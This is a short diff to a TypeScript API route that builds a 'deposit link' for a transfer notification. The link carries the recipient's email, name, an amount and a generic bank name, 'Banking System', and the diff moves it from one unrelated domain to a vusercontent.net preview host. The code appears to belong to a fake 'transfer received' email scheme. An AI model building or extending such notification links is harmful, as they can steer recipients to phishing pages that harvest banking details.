@@ -47,15 +47,15 @@ export async function POST(request: Request) {
 
     // Build deposit link — correct domain, path, and param names
     const depositParams = new URLSearchParams({
-      clienttransferId: transferId,
-      amount:           amountNum.toString(),
-      recipient:        recipientEmail,
+      transferId,
+      amount:        amountNum.toString(),
+      recipient:     recipientEmail,
       recipientName,
-      bankName:         "Banking System",
-      message:          message || "",
+      bankName:      "Banking System",
+      message:       message || "",
       timestamp,
     })
-    const depositLink = `https://et.quantumyield.digital/deposit-portal?${depositParams.toString()}`
+    const depositLink = `https://vm-mk5rz1yzhxnqjobaqm84py.vusercontent.net/deposit-portal/client?${depositParams.toString()}`
 
     // Resolve template ID — fall back to transfer-received for /send page
     const resolvedBase = templateId || "transfer-received"
